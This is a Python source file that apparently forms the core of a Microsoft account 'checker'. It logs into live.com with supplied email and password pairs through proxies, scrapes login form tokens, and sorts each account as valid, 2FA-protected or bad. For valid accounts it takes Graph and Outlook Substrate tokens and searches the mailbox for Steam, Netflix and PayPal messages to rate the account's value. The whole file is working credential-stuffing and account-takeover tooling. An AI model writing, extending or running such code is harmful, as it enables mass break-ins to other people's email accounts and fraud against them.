import re
import time
import uuid
import requests
import urllib3
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning
)

TIMEOUT = 15


def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith('http'):
        return proxy
    parts = proxy.split(':')
    if len(parts) == 4:
        return (
            f"http://{parts[2]}:{parts[3]}"
            f"@{parts[0]}:{parts[1]}"
        )
    elif '@' in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def format_last_date(date_str):
    if not date_str or date_str == "N/A":
        return "N/A"
    try:
        clean = date_str.replace('Z', '')
        if '.' in clean:
            clean = clean.split('.')[0]
        dt = datetime.fromisoformat(clean)
        return dt.strftime("%Y-%m-%d %H:%M")
    except Exception:
        return date_str


def create_session():
    s = requests.Session()
    retry = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=100,
        pool_maxsize=100
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None,
                 inbox_keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = (
            inbox_keywords or ["Steam", "Netflix", "PayPal"]
        )
        self.session = create_session()
        if proxy:
            self.session.proxies = {
                'http': proxy, 'https': proxy
            }
        self.country = None
        self.name = None
        self.sFTTag_url = (
            'https://login.live.com/oauth20_authorize.srf?'
            'client_id=00000000402B5328&'
            'redirect_uri='
            'https://login.live.com/oauth20_desktop.srf&'
            'scope=service::user.auth.xboxlive.com::MBI_SSL&'
            'display=touch&response_type=token&locale=en'
        )

    def get_urlPost_sFTTag(self):
        for _ in range(3):
            try:
                headers = {
                    'User-Agent': (
                        "Mozilla/5.0 (Windows NT 10.0; Win64; "
                        "x64) AppleWebKit/537.36 "
                        "Chrome/119.0.0.0 Safari/537.36 "
                        "Edg/119.0.0.0"
                    ),
                    'Accept': (
                        'text/html,application/xhtml+xml,'
                        'application/xml;q=0.9,*/*;q=0.8'
                    ),
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }

                text = self.session.get(
                    self.sFTTag_url,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False
                ).text

                m = (
                    re.search(
                        r'value=\\\\"(.+?)\\\\"', text, re.S
                    )
                    or re.search(
                        r'value="(.+?)"', text, re.S
                    )
                    or re.search(
                        r"sFTTag:'(.+?)'", text, re.S
                    )
                    or re.search(
                        r'sFTTag:"(.+?)"', text, re.S
                    )
                    or re.search(
                        r'name="PPFT".*?value="(.+?)"',
                        text, re.S
                    )
                )
                if m:
                    sFTTag = m.group(1)
                    m2 = (
                        re.search(
                            r'"urlPost":"(.+?)"', text, re.S
                        )
                        or re.search(
                            r"urlPost:'(.+?)'", text, re.S
                        )
                        or re.search(
                            r'<form.*?action="(.+?)"',
                            text, re.S
                        )
                    )
                    if m2:
                        urlPost = m2.group(1).replace(
                            '&amp;', '&'
                        )
                        return urlPost, sFTTag
            except Exception:
                pass
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        for _ in range(3):
            try:
                data = {
                    'login': self.email,
                    'loginfmt': self.email,
                    'passwd': self.password,
                    'PPFT': sFTTag
                }
                headers = {
                    'Content-Type':
                        'application/x-www-form-urlencoded',
                    'User-Agent': (
                        "Mozilla/5.0 (Windows NT 10.0; "
                        "Win64; x64) AppleWebKit/537.36 "
                        "Chrome/91.0.4472.124 Safari/537.36"
                    ),
                    'Accept': (
                        'text/html,application/xhtml+xml,'
                        'application/xml;q=0.9,*/*;q=0.8'
                    ),
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'close'
                }

                r = self.session.post(
                    urlPost, data=data, headers=headers,
                    allow_redirects=True, timeout=TIMEOUT,
                    verify=False
                )

                if (
                    '#' in r.url
                    and r.url != self.sFTTag_url
                ):
                    token = parse_qs(
                        urlparse(r.url).fragment
                    ).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'

                elif 'cancel?mkt=' in r.text:
                    try:
                        ipt = re.search(
                            r'(?<="ipt" value=").+?(?=">)',
                            r.text
                        )
                        pprid = re.search(
                            r'(?<="pprid" value=").+?(?=">)',
                            r.text
                        )
                        uaid = re.search(
                            r'(?<="uaid" value=").+?(?=">)',
                            r.text
                        )
                        if ipt and pprid and uaid:
                            d = {
                                'ipt': ipt.group(),
                                'pprid': pprid.group(),
                                'uaid': uaid.group()
                            }
                            action = re.search(
                                r'(?<=id="fmHF" action=")'
                                r'.+?(?=" )',
                                r.text
                            )
                            if action:
                                ret = self.session.post(
                                    action.group(),
                                    data=d,
                                    allow_redirects=True,
                                    timeout=TIMEOUT,
                                    verify=False
                                )
                                rurl = re.search(
                                    r'(?<="recoveryCancel":'
                                    r'{"returnUrl":").+?'
                                    r'(?=",)',
                                    ret.text
                                )
                                if rurl:
                                    fin = self.session.get(
                                        rurl.group(),
                                        allow_redirects=True,
                                        timeout=TIMEOUT,
                                        verify=False
                                    )
                                    token = parse_qs(
                                        urlparse(
                                            fin.url
                                        ).fragment
                                    ).get(
                                        'access_token',
                                        ['None']
                                    )[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except Exception:
                        pass

                elif any(v in r.text for v in [
                    'recover?mkt',
                    'account.live.com/identity/confirm?mkt',
                    'Email/Confirm?mkt',
                    '/Abuse?mkt='
                ]):
                    return '2FA'

                elif any(v in r.text.lower() for v in [
                    'password is incorrect',
                    "account doesn't exist",
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    'tried to sign in too many times',
                    'help us protect your account'
                ]):
                    return 'BAD'

            except Exception:
                pass
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            cid = '0000000048170EF2'
            scope = (
                'https://graph.microsoft.com/User.Read '
                'https://graph.microsoft.com/Mail.Read'
            )
            url = (
                f'https://login.live.com/'
                f'oauth20_authorize.srf?'
                f'client_id={cid}&response_type=token'
                f'&scope={scope}'
                f'&redirect_uri='
                f'https://login.live.com/oauth20_desktop.srf'
                f'&prompt=none'
            )
            r = self.session.get(
                url, timeout=TIMEOUT, verify=False
            )
            frag = parse_qs(urlparse(r.url).fragment)
            token = frag.get('access_token', [None])[0]
            if not token:
                scope2 = (
                    'https://graph.microsoft.com/Mail.Read'
                )
                url2 = (
                    f'https://login.live.com/'
                    f'oauth20_authorize.srf?'
                    f'client_id={cid}&response_type=token'
                    f'&scope={scope2}'
                    f'&redirect_uri='
                    f'https://login.live.com/'
                    f'oauth20_desktop.srf'
                    f'&prompt=none'
                )
                r = self.session.get(
                    url2, timeout=TIMEOUT, verify=False
                )
                frag = parse_qs(urlparse(r.url).fragment)
                token = frag.get('access_token', [None])[0]
            return token
        except Exception:
            return None

    def get_profile_via_graph(self, token):
        try:
            h = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
            r = self.session.get(
                'https://graph.microsoft.com/v1.0/me',
                headers=h, timeout=10, verify=False
            )
            if r.status_code == 200:
                d = r.json()
                self.country = d.get(
                    'country',
                    d.get('mobilePhone', 'Unknown')
                )
                if (
                    not self.country
                    or self.country == 'Unknown'
                ):
                    try:
                        r2 = self.session.get(
                            'https://graph.microsoft.com'
                            '/v1.0/me/mailboxSettings',
                            headers=h,
                            timeout=10,
                            verify=False
                        )
                        if r2.status_code == 200:
                            self.country = r2.json().get(
                                'timeZone', 'Unknown'
                            )
                    except Exception:
                        pass
                self.name = d.get('displayName', 'Unknown')
                return True
            return False
        except Exception:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get(
                'https://outlook.live.com/owa/',
                timeout=10, verify=False
            )
            scope = (
                'https://substrate.office.com/'
                'User-Internal.ReadWrite'
            )
            cid = '0000000048170EF2'
            url = (
                f'https://login.live.com/'
                f'oauth20_authorize.srf?'
                f'client_id={cid}&response_type=token'
                f'&scope={scope}'
                f'&redirect_uri='
                f'https://login.live.com/oauth20_desktop.srf'
                f'&prompt=none'
            )
            r = self.session.get(
                url, timeout=TIMEOUT, verify=False
            )
            frag = parse_qs(urlparse(r.url).fragment)
            token = frag.get('access_token', [None])[0]
            if not token:
                return False
            ms_cid = self.session.cookies.get(
                'MSPCID', self.email
            )
            h = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{ms_cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json'
            }
            r = self.session.get(
                'https://substrate.office.com'
                '/profileb2/v2.0/me/V1Profile',
                headers=h, timeout=10, verify=False
            )
            if r.status_code == 200:
                d = r.json()
                accts = d.get('accounts', [{}])
                self.country = accts[0].get(
                    'location', 'Unknown'
                )
                names = d.get('names', [{}])
                self.name = names[0].get(
                    'displayName', 'Unknown'
                )
                return True
            return False
        except Exception:
            return False

    def check_inbox(self):
        total, info, dates = self._check_graph()
        if total > 0:
            return total, info, dates
        return self._check_substrate()

    def _check_graph(self):
        token = self.get_graph_token()
        if not token:
            return 0, [], {}
        found = []
        total_sum = 0
        kw_dates = {}
        h = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        for kw in self.inbox_keywords:
            try:
                q = (
                    f"https://graph.microsoft.com"
                    f"/v1.0/me/messages?"
                    f"$search=\"subject:{kw}\""
                    f"&$select=subject,receivedDateTime"
                    f"&$top=25"
                    f"&$orderby=receivedDateTime desc"
                )
                r = self.session.get(
                    q, headers=h, timeout=10, verify=False
                )
                if r.status_code == 200:
                    d = r.json()
                    t = d.get('@odata.count', 0)
                    if t == 0 and 'value' in d:
                        t = len(d['value'])
                    if t > 0:
                        total_sum += t
                        found.append(f"{kw}: {t}")
                        if d.get('value'):
                            dt = d['value'][0].get(
                                'receivedDateTime', 'N/A'
                            )
                            kw_dates[kw] = (
                                format_last_date(dt)
                            )
            except Exception:
                pass
        return total_sum, found, kw_dates

    def _check_substrate(self):
        try:
            self.session.get(
                'https://outlook.live.com/owa/',
                timeout=10, verify=False
            )
            scope = (
                'https://substrate.office.com/'
                'User-Internal.ReadWrite'
            )
            cid = '0000000048170EF2'
            url = (
                f'https://login.live.com/'
                f'oauth20_authorize.srf?'
                f'client_id={cid}&response_type=token'
                f'&scope={scope}'
                f'&redirect_uri='
                f'https://login.live.com/oauth20_desktop.srf'
                f'&prompt=none'
            )
            r = self.session.get(
                url, timeout=TIMEOUT, verify=False
            )
            frag = parse_qs(urlparse(r.url).fragment)
            token = frag.get('access_token', [None])[0]
            if not token:
                return 0, [], {}
        except Exception:
            return 0, [], {}

        ms_cid = self.session.cookies.get(
            'MSPCID', self.email
        )
        h = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{ms_cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }
        found = []
        total_sum = 0
        kw_dates = {}
        search_url = (
            'https://outlook.live.com/search/api/v2/query?'
            'n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        )
        for kw in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [
                            {'Term': {
                                'DistinguishedFolderName':
                                    'msgfolderroot'
                            }},
                            {'Term': {
                                'DistinguishedFolderName':
                                    'DeletedItems'
                            }}
                        ]},
                        'From': 0,
                        'Query': {'QueryString': kw},
                        'Size': 25,
                        'Sort': [
                            {
                                'Field': 'Score',
                                'SortDirection': 'Desc',
                                'Count': 3
                            },
                            {
                                'Field': 'Time',
                                'SortDirection': 'Desc'
                            }
                        ],
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{
                        'Query': {'QueryString': kw},
                        'EntityTypes': ['Event', 'File'],
                        'From': 0,
                        'Size': 10,
                        'EnableAsyncResolution': True
                    }],
                    'QueryAlterationOptions': {
                        'EnableSuggestion': True,
                        'EnableAlteration': True
                    }
                }
                r = self.session.post(
                    search_url, json=payload, headers=h,
                    timeout=10, verify=False
                )
                if r.status_code == 200:
                    d = r.json()
                    txt = r.text
                    total = 0
                    if 'EntitySets' in d:
                        for es in d['EntitySets']:
                            if 'ResultSets' in es:
                                for rs in es['ResultSets']:
                                    if 'Total' in rs:
                                        total = rs['Total']
                                    elif 'ResultCount' in rs:
                                        total = (
                                            rs['ResultCount']
                                        )
                                    elif 'Results' in rs:
                                        total = len(
                                            rs['Results']
                                        )
                    if total > 0:
                        total_sum += total
                        found.append(f"{kw}: {total}")
                        idx = txt.find(
                            '"LastModifiedTime":"'
                        )
                        last = "N/A"
                        if idx != -1:
                            idx += len(
                                '"LastModifiedTime":"'
                            )
                            end = txt.find('"', idx)
                            if end != -1:
                                last = txt[idx:end]
                        kw_dates[kw] = (
                            format_last_date(last)
                        )
            except Exception:
                pass
        return total_sum, found, kw_dates
